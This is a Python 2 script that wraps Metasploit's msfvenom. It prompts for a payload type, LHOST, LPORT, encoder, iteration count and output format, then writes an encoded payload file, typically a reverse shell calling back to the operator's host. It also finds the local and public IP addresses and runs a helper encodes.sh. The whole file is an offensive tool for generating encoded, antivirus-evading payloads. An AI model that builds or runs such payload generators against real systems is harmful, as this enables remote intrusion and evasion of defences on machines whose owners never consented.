import sys, os, socket, time
from subprocess import call
from colored import fg, bg, attr
from urllib2 import urlopen


def calling():
     try:
        print ("\n  \033[1;32m[+] Loading...\033[0m")
        call(["msfvenom"], stderr=open(os.devnull))
     except OSError:
        print ("\n  \033[1;31m[-]\033[1;93m No msfvenom found")

def getIP():
   try:
       sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
       sock.connect(('google.com', 0))
       Lsubaddr = sock.getsockname()[0]
       Laddr = urlopen('http://ip.42.pl/raw').read()
       return(Lsubaddr, Laddr)
   except socket.error as (msg):
       print ("\033[31m[Error] \033[33m ") + (str(msg)) + "\033[0m"
   except socket.gaierror as (msg):
       print ("\033[31m[Error] \033[33m ") + (str(msg)) + "\033[0m"

def start():
   try:
       calling()
       os.system("bash encodes.sh")
       time.sleep(1.5)
       (Lsubaddr, Laddr) = getIP()
       print "\n  Local Sub IP Address :  " + Lsubaddr
       print "\n  Local IP Address     :  " + Laddr
       Mip = raw_input("\n  %s%sEnter Your Local IP Address%s > " % (fg('black'), bg(160), attr(0)))
       if Mip == 'main':
         print ""
       else:
         print "=" * 47
         payL = raw_input("\n  %s%sPayload Type%s > " % (fg('black'), bg(160), attr(0)))
         time.sleep(1.5)
         print ("\n  \033[1;32m[+]\033[1;0mpayload type has been set to \033[4m{}\033[0m".format(payL))
         localHost = raw_input("\n  %s%sLHOST%s > " % (fg('black'), bg(160), attr(0)))
         time.sleep(1.5)
         print ("\n  \033[1;32m[+]\033[1;0mLHOST has been set to \033[4m{}\033[0m".format(localHost))
         localPort = raw_input("\n  %s%sLPORT%s > " % (fg('black'), bg(160), attr(0)))
         time.sleep(1.5)
         print ("\n  \033[1;32m[+]\033[1;0mLPORT has been set to \033[4m{}\033[0m".format(localPort))
         Fformat = raw_input("\n  %s%sfile format%s > " % (fg('black'), bg(160), attr(0)))
         time.sleep(1.5)
         print ("\n  \033[1;32m[+]\033[1;0mfile format has been set to \033[4m{}\033[0m".format(Fformat))
         iterations = raw_input("\n  %s%snumbers of iterations%s > " % (fg('black'), bg(160), attr(0)))
         time.sleep(1.5)
         print ("\n  \033[1;32m[+]\033[1;0miterations has been set to \033[4m{}\033[0m".format(iterations))
         Encoder = raw_input("\n  %s%sencoder%s > " % (fg('black'), bg(160), attr(0)))
         time.sleep(1.5)
         print ("\n  \033[1;32m[+]\033[1;0mencoder has been set to \033[4m{}\033[0m".format(Encoder))
         fileN = raw_input("\n  %s%sfilename%s > " % (fg('black'), bg(160), attr(0)))
         time.sleep(1.5)
         print ("\n  \033[1;32m[+]\033[1;0mfilename has been set to \033[4m{}\033[0m".format(fileN))
         time.sleep(1.5)
         print "=" * 47
         print ("\n  \033[32m[+]\033[1;93m Creating Payload File\033[0m\n")
         with open("{}.{}".format(fileN, Fformat), 'w') as outfile:
           call(["msfvenom", "-p", str(payL), "LHOST={}".format(localHost), "LPORT={}".format(localPort), "-e", str(Encoder), "-i", str(iterations), "-f", str(Fformat)], stdout=outfile)
         print ("\n\033[32m  [ process done! ]\033[0m")
         ex = raw_input("\n  %s%sdo you want to back in main program [ Y/n ]%s > " % (fg('black'), bg(160), attr(0)))
         if ex == 'n' or ex == 'N':
             sys.exit()

         elif ex == 'y' or ex == 'Y':
             print ""

   except OSError:
       print ("\033[1;31m[-]\033[1;93m No msfvenom found")
       time.sleep(1.5)
       print ""